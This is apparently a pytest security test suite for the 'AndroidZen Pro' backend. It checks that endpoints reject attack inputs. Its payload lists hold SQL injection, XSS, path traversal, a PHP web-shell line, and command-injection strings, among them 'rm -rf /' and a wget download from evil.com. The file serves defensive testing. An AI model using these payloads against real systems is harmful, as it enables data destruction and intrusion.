"""
Security tests for AndroidZen Pro backend.
"""

import pytest
import jwt
import time
from datetime import datetime, timedelta
from httpx import AsyncClient
from unittest.mock import patch

from backend.core.auth import AuthManager


@pytest.mark.security
class TestSecurity:
    """Comprehensive security tests."""

    async def test_authentication_required(self, async_client: AsyncClient):
        """Test that authentication is required for protected endpoints."""
        protected_endpoints = [
            "/api/devices/",
            "/api/settings/",
            "/api/security/events",
            "/api/monitoring/system-status",
            "/api/storage/cleanup"
        ]
        
        for endpoint in protected_endpoints:
            response = await async_client.get(endpoint)
            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"

    async def test_invalid_token_rejection(self, async_client: AsyncClient):
        """Test that invalid tokens are rejected."""
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid_token",
            "Bearer expired.token.here",
            "Bearer malformed.token",
            "",
            "Basic dGVzdDp0ZXN0"  # Basic auth should be rejected
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token}
            response = await async_client.get("/api/devices/", headers=headers)
            assert response.status_code == 401, f"Invalid token {token} should be rejected"

    def test_password_hashing(self):
        """Test password hashing functionality."""
        auth_manager = AuthManager()
        
        passwords = ["password123", "complex_P@ssw0rd!", "", "short", "a" * 100]
        
        for password in passwords:
            hashed = auth_manager.hash_password(password)
            
            # Hash should be different from original
            assert hashed != password
            
            # Hash should be consistent
            assert auth_manager.verify_password(password, hashed)
            
            # Wrong password should fail
            assert not auth_manager.verify_password(password + "wrong", hashed)

    def test_jwt_token_creation_and_validation(self):
        """Test JWT token creation and validation."""
        auth_manager = AuthManager()
        
        user_data = {
            "user_id": "test_user_123",
            "username": "testuser",
            "role": "admin"
        }
        
        # Create token
        token = auth_manager.create_access_token(user_data)
        
        assert isinstance(token, str)
        assert len(token) > 0
        
        # Validate token
        decoded_data = auth_manager.verify_token(token)
        
        assert decoded_data["user_id"] == user_data["user_id"]
        assert decoded_data["username"] == user_data["username"]
        assert "exp" in decoded_data  # Expiration should be set

    def test_token_expiration(self):
        """Test JWT token expiration."""
        auth_manager = AuthManager()
        
        user_data = {"user_id": "test_user", "username": "testuser"}
        
        # Create token with short expiration
        with patch('backend.core.auth.timedelta') as mock_timedelta:
            mock_timedelta.return_value = timedelta(seconds=-1)  # Already expired
            expired_token = auth_manager.create_access_token(user_data)
        
        # Expired token should be rejected
        with pytest.raises(jwt.ExpiredSignatureError):
            auth_manager.verify_token(expired_token)

    async def test_sql_injection_protection(self, async_client: AsyncClient, authenticated_headers):
        """Test protection against SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE devices; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1'; WAITFOR DELAY '00:00:05' --"
        ]
        
        for payload in sql_injection_payloads:
            # Test device ID parameter
            response = await async_client.get(
                f"/api/devices/{payload}",
                headers=authenticated_headers
            )
            # Should return 404 or 422, not 500 (which would indicate SQL error)
            assert response.status_code in [404, 422], \
                f"SQL injection payload '{payload}' may have been processed"
            
            # Test query parameters
            response = await async_client.get(
                "/api/devices/",
                params={"search": payload},
                headers=authenticated_headers
            )
            assert response.status_code != 500, \
                f"SQL injection in query parameter failed for '{payload}'"

    async def test_xss_protection(self, async_client: AsyncClient, authenticated_headers):
        """Test protection against XSS attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "\";alert('XSS');//",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
        
        for payload in xss_payloads:
            # Test settings endpoints with user input
            response = await async_client.post(
                "/api/settings/",
                json={
                    "setting_name": "test_setting",
                    "setting_value": payload
                },
                headers=authenticated_headers
            )
            
            # Should not return the payload unescaped
            response_text = response.text
            assert "<script>" not in response_text, \
                f"XSS payload '{payload}' may not be properly escaped"
            assert "javascript:" not in response_text, \
                f"JavaScript protocol in XSS payload '{payload}' not blocked"

    async def test_csrf_protection(self, async_client: AsyncClient, authenticated_headers):
        """Test CSRF protection for state-changing operations."""
        # Test POST, PUT, DELETE operations without proper headers
        endpoints_methods = [
            ("POST", "/api/devices/connect"),
            ("POST", "/api/settings/"),
            ("PUT", "/api/settings/test_setting"),
            ("DELETE", "/api/devices/test_device/apps/com.test.app")
        ]
        
        for method, endpoint in endpoints_methods:
            # Request without proper origin/referer headers (simulating CSRF)
            malicious_headers = {
                **authenticated_headers,
                "Origin": "https://evil-site.com",
                "Referer": "https://evil-site.com/attack.html"
            }
            
            if method == "POST":
                response = await async_client.post(endpoint, headers=malicious_headers)
            elif method == "PUT":
                response = await async_client.put(endpoint, headers=malicious_headers)
            elif method == "DELETE":
                response = await async_client.delete(endpoint, headers=malicious_headers)
            
            # Should either reject malicious origin or require CSRF token
            # (depending on implementation, might be 400, 403, or handled by CORS)
            assert response.status_code != 200 or "CSRF" in response.text, \
                f"CSRF protection may be missing for {method} {endpoint}"

    async def test_rate_limiting(self, async_client: AsyncClient, authenticated_headers):
        """Test rate limiting protection."""
        # Make rapid requests to test rate limiting
        endpoint = "/api/devices/"
        rapid_requests = 100
        success_count = 0
        rate_limited_count = 0
        
        for _ in range(rapid_requests):
            response = await async_client.get(endpoint, headers=authenticated_headers)
            
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:  # Too Many Requests
                rate_limited_count += 1
        
        # Should have rate limiting after certain threshold
        if rapid_requests > 50:  # Only test if making many requests
            assert rate_limited_count > 0 or success_count < rapid_requests, \
                "Rate limiting should be active for rapid requests"

    async def test_input_validation(self, async_client: AsyncClient, authenticated_headers):
        """Test input validation and sanitization."""
        # Test various invalid inputs
        invalid_payloads = [
            {"device_id": ""},  # Empty string
            {"device_id": "a" * 1000},  # Too long
            {"device_id": "../../../etc/passwd"},  # Path traversal
            {"device_id": "\x00\x01\x02"},  # Binary data
            {"cpu_usage": -1},  # Negative values where inappropriate
            {"cpu_usage": 101},  # Values out of range
            {"cpu_usage": "not_a_number"},  # Wrong data type
            {"memory_usage": float('inf')},  # Infinity
            {"memory_usage": float('nan')},  # NaN
            {"settings": {"key": "value" * 10000}},  # Very large data
        ]
        
        for payload in invalid_payloads:
            response = await async_client.post(
                "/api/devices/test_device/analytics",
                json=payload,
                headers=authenticated_headers
            )
            
            # Should return validation error, not 500
            assert response.status_code in [400, 422], \
                f"Invalid payload should be rejected: {payload}"

    async def test_file_upload_security(self, async_client: AsyncClient, authenticated_headers):
        """Test file upload security (if applicable)."""
        # Test malicious file uploads
        malicious_files = [
            ("test.exe", b"MZ\x90\x00"),  # Executable file
            ("../../../etc/passwd", b"content"),  # Path traversal
            ("test.php", b"<?php system($_GET['cmd']); ?>"),  # Server-side script
            ("test.js", b"<script>alert('XSS')</script>"),  # Client-side script
            (".htaccess", b"Options +Indexes"),  # Apache config
            ("test.svg", b"<svg onload='alert(1)'></svg>"),  # SVG with script
        ]
        
        for filename, content in malicious_files:
            files = {"file": (filename, content, "application/octet-stream")}
            
            # Try to upload to any file upload endpoint
            response = await async_client.post(
                "/api/devices/test_device/install",
                files=files,
                headers=authenticated_headers
            )
            
            # Should reject malicious files
            assert response.status_code in [400, 403, 422], \
                f"Malicious file '{filename}' should be rejected"

    def test_secrets_not_exposed(self):
        """Test that secrets are not exposed in responses or logs."""
        import os
        from backend.core.auth import AuthManager
        
        auth_manager = AuthManager()
        
        # Test that secret key is not in string representation
        auth_repr = repr(auth_manager)
        auth_str = str(auth_manager)
        
        # Should not contain actual secret values
        secret_patterns = ["secret", "key", "password", "token"]
        
        for pattern in secret_patterns:
            # Check if any environment variables with secrets are exposed
            for env_var in os.environ:
                if pattern.lower() in env_var.lower():
                    env_value = os.environ[env_var]
                    assert env_value not in auth_repr, \
                        f"Secret from {env_var} exposed in repr"
                    assert env_value not in auth_str, \
                        f"Secret from {env_var} exposed in str"

    async def test_directory_traversal_protection(self, async_client: AsyncClient, authenticated_headers):
        """Test protection against directory traversal attacks."""
        traversal_payloads = [
            "../",
            "..\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f",  # URL encoded ../
            "%2e%2e%5c",  # URL encoded ..\
            "....//",
            "....\\\\",
            "..%2f",
            "..%5c",
            "..%252f",  # Double URL encoded
            "..%c0%af",  # Unicode encoded
        ]
        
        for payload in traversal_payloads:
            # Test file/path parameters
            response = await async_client.get(
                f"/api/devices/{payload}",
                headers=authenticated_headers
            )
            
            # Should not return 500 or expose file system
            assert response.status_code in [400, 404, 422], \
                f"Directory traversal payload '{payload}' may have been processed"

    async def test_command_injection_protection(self, async_client: AsyncClient, 
                                               authenticated_headers, mock_adb_device):
        """Test protection against command injection."""
        command_injection_payloads = [
            "shell ls; rm -rf /",
            "shell ls && rm -rf /",
            "shell ls | rm -rf /",
            "shell ls `rm -rf /`",
            "shell ls $(rm -rf /)",
            "shell ls; cat /etc/passwd",
            "shell ls; wget http://evil.com/malware",
            "shell 'ls; rm -rf /'",
            'shell "ls; rm -rf /"',
            "shell ls\nrm -rf /",
            "shell ls\rrm -rf /"
        ]
        
        device_id = mock_adb_device.device_id
        
        for payload in command_injection_payloads:
            response = await async_client.post(
                f"/api/devices/{device_id}/execute",
                json={"command": payload},
                headers=authenticated_headers
            )
            
            # Should reject dangerous commands
            assert response.status_code in [400, 403], \
                f"Command injection payload should be blocked: {payload}"

    async def test_cors_security(self, async_client: AsyncClient):
        """Test CORS security configuration."""
        # Test with malicious origins
        malicious_origins = [
            "https://evil.com",
            "http://malicious-site.com",
            "https://phishing-site.com",
            "null",
            "*"
        ]
        
        for origin in malicious_origins:
            headers = {"Origin": origin}
            response = await async_client.options("/api/devices/", headers=headers)
            
            # Check CORS headers
            cors_origin = response.headers.get("Access-Control-Allow-Origin")
            
            # Should not allow arbitrary origins
            if cors_origin:
                assert cors_origin != "*", "Wildcard CORS origin is insecure"
                assert origin not in cors_origin or origin in [
                    "http://localhost:3000",
                    "http://localhost:5173",
                    "http://127.0.0.1:3000"
                ], f"Malicious origin {origin} should not be allowed"

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks on authentication."""
        auth_manager = AuthManager()
        
        # Test password verification timing
        correct_password = "correct_password"
        hashed_password = auth_manager.hash_password(correct_password)
        
        # Test with correct password
        start_time = time.time()
        result1 = auth_manager.verify_password(correct_password, hashed_password)
        time1 = time.time() - start_time
        
        # Test with incorrect password
        start_time = time.time()
        result2 = auth_manager.verify_password("wrong_password", hashed_password)
        time2 = time.time() - start_time
        
        assert result1 == True
        assert result2 == False
        
        # Timing difference should be minimal (bcrypt handles this)
        time_difference = abs(time1 - time2)
        assert time_difference < 0.1, \
            f"Timing attack may be possible: {time_difference:.3f}s difference"

    async def test_information_disclosure(self, async_client: AsyncClient, authenticated_headers):
        """Test for information disclosure vulnerabilities."""
        # Test error responses don't leak sensitive information
        response = await async_client.get(
            "/api/devices/nonexistent_device",
            headers=authenticated_headers
        )
        
        # Error messages should not reveal system information
        error_text = response.text.lower()
        sensitive_info = [
            "traceback",
            "stack trace",
            "exception",
            "database",
            "sql",
            "file not found",
            "path",
            "directory"
        ]
        
        for info in sensitive_info:
            assert info not in error_text, \
                f"Error response may leak sensitive information: {info}"

    async def test_session_security(self, async_client: AsyncClient):
        """Test session security measures."""
        # Test that tokens are not exposed in URLs or logs
        response = await async_client.get("/api/auth/login")
        
        # Should not expose tokens in redirect URLs or responses
        response_text = response.text
        
        # Look for common token patterns
        import re
        token_patterns = [
            r'token=[a-zA-Z0-9._-]+',
            r'jwt=[a-zA-Z0-9._-]+',
            r'session=[a-zA-Z0-9._-]+',
            r'auth=[a-zA-Z0-9._-]+'
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, response_text)
            assert not matches, f"Token may be exposed in response: {matches}"

    def test_environment_variables_security(self):
        """Test that sensitive environment variables are properly secured."""
        import os
        
        # List of sensitive environment variable names
        sensitive_vars = [
            "SECRET_KEY",
            "DATABASE_URL",
            "API_KEY",
            "PASSWORD",
            "TOKEN",
            "PRIVATE_KEY"
        ]
        
        for var_name in sensitive_vars:
            if var_name in os.environ:
                value = os.environ[var_name]
                
                # Should not be empty or use default/example values
                insecure_values = ["", "change_me", "secret", "password", "key", "default"]
                assert value.lower() not in insecure_values, \
                    f"Insecure default value for {var_name}"
                
                # Should have minimum length for cryptographic values
                if "key" in var_name.lower() or "secret" in var_name.lower():
                    assert len(value) >= 32, \
                        f"Cryptographic value {var_name} should be at least 32 characters"

    async def test_audit_logging(self, async_client: AsyncClient, authenticated_headers):
        """Test that security events are properly logged."""
        # This would typically test that security events are logged
        # For now, we test that operations complete without errors
        
        # Test operations that should be audited
        operations = [
            ("POST", "/api/devices/connect", {"connection_type": "usb"}),
            ("DELETE", "/api/devices/test_device/apps/com.test.app", {}),
            ("POST", "/api/security/scan", {}),
        ]
        
        for method, endpoint, data in operations:
            if method == "POST":
                response = await async_client.post(
                    endpoint, 
                    json=data, 
                    headers=authenticated_headers
                )
            elif method == "DELETE":
                response = await async_client.delete(endpoint, headers=authenticated_headers)
            
            # Operations should complete (may return various status codes based on implementation)
            assert response.status_code < 500, \
                f"Security operation failed: {method} {endpoint}"
